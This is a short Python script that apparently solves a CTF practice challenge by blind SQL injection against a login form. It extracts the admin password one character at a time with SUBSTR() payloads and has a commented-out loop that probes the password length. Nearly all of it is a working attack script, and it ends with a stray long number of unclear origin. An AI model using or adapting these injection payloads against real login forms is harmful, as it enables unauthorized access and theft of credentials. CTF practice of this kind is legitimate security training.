import requests

# for x in range(1, 30):
#     url = 'http://ctfq.sweetduet.info:10080/~q6/'
#     temp = '1\' or length(user.pass) = ' + str(x) + ' or \'1\' = \'12'
#     data = {'id': 'admin', 'pass': temp}
#     response = requests.post(url, data=data)
#     print str(x) + str(response.content.splitlines()[8] == "      Congratulations!<br>")

dataAl = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'

for x in range(1, 22):
    for letter in dataAl:
        url = 'http://ctfq.sweetduet.info:10080/~q6/'
        temp = '1\' or SUBSTR(user.pass, ' + str(x) + ', 1) = \'' + letter + '\' or \'1\' = \'12'
        # print temp
        data = {'id': 'admin', 'pass': temp}
        response = requests.post(url, data=data)
        if response.content.splitlines()[8] == "      Congratulations!<br>":
            print letter,
39830963251313012931406054205649358377525286926249590L